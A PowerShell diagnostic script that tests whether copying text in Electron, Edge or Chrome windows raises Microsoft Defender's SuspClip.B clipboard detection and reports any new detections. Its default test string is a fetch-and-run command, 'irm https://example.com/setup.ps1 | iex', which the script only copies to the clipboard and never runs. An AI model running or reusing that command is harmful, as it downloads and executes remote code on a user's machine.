# Does copying in a window raise Defender's Behavior:Win32/SuspClip.B (#1185, #1186)? For each case it opens a window
# (a bare Electron one, or Edge or Chrome in a throwaway profile) at an address, copies a line twice (copy.mjs's Ctrl+C
# through the debugging protocol, then a real key press to the focused window), waits, and prints the Defender detections that arrived meanwhile. Run it with the `run` task (it needs the screen):
#   powershell -File kit/skills/run-on-windows/scripts/defender-copy/check.ps1 [-Cases electron@other,edge@zip] [-Wait 25]
# The first run installs Electron into %LOCALAPPDATA%\defender-copy (about 100 MB, from npm). Chrome is the box's
# per-user install (Google's chrome_installer.exe /silent /install), since Josh's detections all named chrome.exe.
param(
  [string[]]$Cases = @('chrome@zip', 'electron@other', 'electron@zip', 'edge@zip', 'chrome@other'),
  [int]$Wait = 25,
  [string]$Text = 'irm https://example.com/setup.ps1 | iex'
)
$ErrorActionPreference = 'Continue'
$node = (Get-Command node).Source
Add-Type -AssemblyName System.Windows.Forms
$shell = New-Object -ComObject WScript.Shell
$here = $PSScriptRoot
$urls = @{ zip = 'https://citadel.zip/'; other = 'https://cara.apps.webplatformisbestplatform.net/c/' }
$dir = Join-Path $env:LOCALAPPDATA 'defender-copy'
$electron = Join-Path $dir 'node_modules\electron\dist\electron.exe'
if (-not (Test-Path $electron)) {
  New-Item -ItemType Directory -Force $dir | Out-Null
  Push-Location $dir
  try { '{"name":"defender-copy","private":true}' | Set-Content package.json; & npm.cmd install --no-audit --no-fund electron 2>&1 | Out-Host; & $node node_modules/electron/install.js }  # npm 11 skipped its postinstall
  finally { Pop-Location }
}
$chrome = @("$env:ProgramFiles\Google\Chrome\Application\chrome.exe", "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
$edge = @("${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe", "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
"electron $(& $electron --version) - node $(& $node --version) - Defender $((Get-MpComputerStatus).AntivirusSignatureVersion)"

function Detections { @(Get-MpThreatDetection -ErrorAction SilentlyContinue) }
$all = Detections
"before: $(@($all).Count) detection(s) on this PC in total"

foreach ($case in $Cases) {
  $kind, $where = $case -split '@'
  $url = $urls[$where]
  $port = Get-Random -Minimum 20000 -Maximum 29999
  $prof = Join-Path $env:TEMP "defender-copy-$port"
  $since = Get-Date
  if ($kind -eq 'electron') {
    $p = Start-Process $electron -ArgumentList "--remote-debugging-port=$port", "`"$here\electron-main.cjs`"", $url -PassThru
  } else {
    $p = Start-Process $(if ($kind -eq 'chrome') { $chrome } else { $edge }) -ArgumentList "--remote-debugging-port=$port", "--user-data-dir=`"$prof`"", '--no-first-run', '--no-default-browser-check', '--new-window', $url -PassThru
  }
  Set-Clipboard -Value 'cleared'
  # The text goes base64: a command line holding `irm ... | iex` is itself a Defender detection (2147852719), on node.
  & $node "$here\copy.mjs" $port ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Text))) | ForEach-Object { "  $_" }
  # Then a real key press: Ctrl+C sent to the window by Windows, with the text still selected.
  Set-Clipboard -Value 'cleared'
  if ($shell.AppActivate($p.Id)) { Start-Sleep -Milliseconds 500; [System.Windows.Forms.SendKeys]::SendWait('^c'); "  real Ctrl+C sent" } else { "  real Ctrl+C: window not found" }
  Start-Sleep -Seconds $Wait
  $clip = (Get-Clipboard -Raw) -replace '\s+$', ''
  $new = @(Detections | Where-Object { $_.InitialDetectionTime -ge $since.AddSeconds(-2) })
  "$case ($url): clipboard '$clip' - new detections: $($new.Count)"
  foreach ($d in $new) { "  DETECTED ThreatID $($d.ThreatID) at $($d.InitialDetectionTime) process $($d.ProcessName) - $($d.Resources -join '; ')" }
  # Edge leaves helper processes behind its first one: stop every process started from this case's profile or exe.
  Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine.Contains("--remote-debugging-port=$port") -or $_.CommandLine.Contains($prof)) } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
  Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 2
  Remove-Item -Recurse -Force $prof -ErrorAction SilentlyContinue
}
"after: $(@(Detections).Count) detection(s) on this PC in total"
Get-MpThreat -ErrorAction SilentlyContinue | Where-Object { $_.ThreatID -eq 2147981387 } | ForEach-Object { "threat record: $($_.ThreatName) id $($_.ThreatID)" }
